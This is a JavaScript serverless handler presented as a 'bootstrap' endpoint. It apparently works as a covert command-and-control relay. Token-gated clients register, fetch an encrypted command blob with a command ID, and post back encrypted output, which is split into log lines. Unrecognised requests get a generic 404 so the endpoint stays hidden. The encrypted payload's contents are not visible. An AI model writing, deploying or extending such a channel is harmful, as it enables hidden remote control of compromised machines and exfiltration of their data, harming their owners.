import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '26';
const CONTROL_PAYLOAD = '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';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
